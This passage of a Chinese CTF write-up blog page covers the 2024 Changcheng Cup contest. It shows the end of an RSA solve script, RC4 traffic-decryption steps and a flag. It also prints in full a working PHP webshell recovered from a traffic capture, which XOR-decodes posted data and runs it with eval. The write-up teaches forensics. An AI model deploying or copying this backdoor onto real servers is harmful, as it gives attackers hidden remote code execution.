class="hljs-built_in">int</span>(a*x + b + j) % p<br>p = <span class="hljs-built_in">int</span>(x + i)<br><span class="hljs-built_in">print</span>(q)<br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-keyword">assert</span> is_prime(p) <span class="hljs-keyword">and</span> is_prime(q)<br><br>d = <span class="hljs-built_in">pow</span>(<span class="hljs-number">0x10001</span>,-<span class="hljs-number">1</span>,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure>
+
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="BrickGame"><a href="#BrickGame" class="headerlink" title="BrickGame"></a>BrickGame</h4><p><img src="/mdimg/CCB2024/5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="漏洞探踪，流量解密"><a href="#漏洞探踪，流量解密" class="headerlink" title="漏洞探踪，流量解密"></a>漏洞探踪，流量解密</h4><p><img src="/mdimg/CCB2024/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据题目信息和流量包掩码爆破192.168.30.xxx；得到压缩包2的解压密码是192.168.30.234</p>
+<p>筛选http流得到RC4hint</p>
+<p><img src="/mdimg/CCB2024/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>逐行查阅http流，找到rec的密文和key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">3561373666363735313537366462653161663439333238616131643264326265613136656636326166613361376336313664    #ENC<br>6264623865323165616365383164356664323163613434356363623335303731  #KEY<br></code></pre></td></tr></table></figure>
+
+<p><img src="/mdimg/CCB2024/8.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h4><p><img src="/mdimg/CCB2024/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>导出保存为rar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;25ming@&#x27;</span>;   <span class="hljs-comment">#压缩包密码</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>解压得到一堆md5 挨个解密即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">8</span>fa14cdd754f91cc6554c9e71929cce7<br><span class="hljs-number">2</span>db95e8e1a9267b7a1188556b2013b33<br><span class="hljs-number">0</span>cc175b9c0f1b6a831c399e269772661<br>b2f5ff47436671b6e533d8dc3614845d<br>f95b70fdc3088560732a5ac135644506<br>b9ece18c950afbfa6b0fdbfa4ff731d3<br><span class="hljs-number">2510</span>c39011c5be704182423e3a695e91<br>e1671797c52e15f763380b45e841ec32<br>b14a7b8059d9c055954c92674ce60032<br><span class="hljs-number">6</span>f8f57715090da2632453988d9a1501b<br>cfcd208495d565ef66e7dff9f98764da<br><span class="hljs-number">03</span>c7c0ace395d80182db07ae2c30f034<br>e358efa489f58062f10dd7316b65649e<br>b14a7b8059d9c055954c92674ce60032<br>c81e728d9d4c2f636f067f89cc14862c<br>e1671797c52e15f763380b45e841ec32<br><span class="hljs-number">4</span>a8a08f09d37b73795649038408b5f33<br><span class="hljs-number">4</span>c614360da93c0a041b22e537de151eb<br><span class="hljs-number">4</span>b43b0aee35624cd95b910189b3dc231<br>e1671797c52e15f763380b45e841ec32<br>b14a7b8059d9c055954c92674ce60032<br>e1671797c52e15f763380b45e841ec32<br><span class="hljs-number">8</span>d9c307cb7f3c4a32822a51922d1ceaa<br><span class="hljs-number">4</span>a8a08f09d37b73795649038408b5f33<br><span class="hljs-number">4</span>b43b0aee35624cd95b910189b3dc231<br><span class="hljs-number">57</span>cec4137b614c87cb4e24a3d003a3e0<br><span class="hljs-number">83878</span>c91171338902e0fe0fb97a8c47a<br>e358efa489f58062f10dd7316b65649e<br><span class="hljs-number">865</span>c0c0b4ab0e063e5caa3387c1a8741<br>d95679752134a2d9eb61dbd7b91c4bcc<br><span class="hljs-number">7</span>b8b965ad4bca0e41ab51de7b31363a1<br><span class="hljs-number">9033e0</span>e305f247c0c3c80d0c7848c8b3<br><span class="hljs-number">9033e0</span>e305f247c0c3c80d0c7848c8b3<br><span class="hljs-number">9033e0</span>e305f247c0c3c80d0c7848c8b3<br>cbb184dd8e05c9709e5dcaedaa0495cf<br><br><span class="hljs-comment">#flag&#123;The_m0st_2ecUre_eNcrYption!!!&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Write-Up/" class="print-no-link">#Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>第四届“长城杯”网络安全大赛</div>
+      <div>https://g1at.github.io/2024/09/08/ccb2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>g0at</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/10/IoV-CTF/" title="IoV 1n CTF">
+                        <span class="hidden-mobile">IoV 1n CTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"rF6DPbqXmz9oaKXSwioOtyuv-gzGzoHsz","appKey":"7WylA7nweHQ3Z3Y3lnez5NTm","path":"window.location.pathname","placeholder":"来唠嗑","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       Hor1zon <i class="iconfont icon-love"></i> g0at 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
